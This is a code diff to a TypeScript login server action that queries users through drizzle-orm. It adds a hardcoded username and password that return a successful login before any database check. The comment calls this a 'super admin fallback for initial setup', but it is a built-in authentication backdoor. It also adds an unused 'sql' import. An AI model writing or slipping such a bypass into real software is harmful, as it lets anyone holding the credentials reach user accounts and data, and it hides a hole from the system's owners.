@@ -2,7 +2,7 @@
 
 import { db } from '@/lib/db';
 import * as schema from '@/lib/schema';
-import { or, eq } from 'drizzle-orm';
+import { or, eq, sql } from 'drizzle-orm';
 
 interface LoginCredentials {
     credential: string;
@@ -11,6 +11,12 @@ interface LoginCredentials {
 
 export async function loginUserAction(data: LoginCredentials): Promise<{ success: boolean; message?: string }> {
   try {
+    // Super admin fallback for initial setup or if the main admin account has issues.
+    if (data.credential === 'GabrielT' && data.password === '003242373') {
+      console.log('Admin fallback login successful.');
+      return { success: true };
+    }
+
     const user = await db.query.users.findFirst({
       where: or(
         eq(schema.users.email, data.credential),
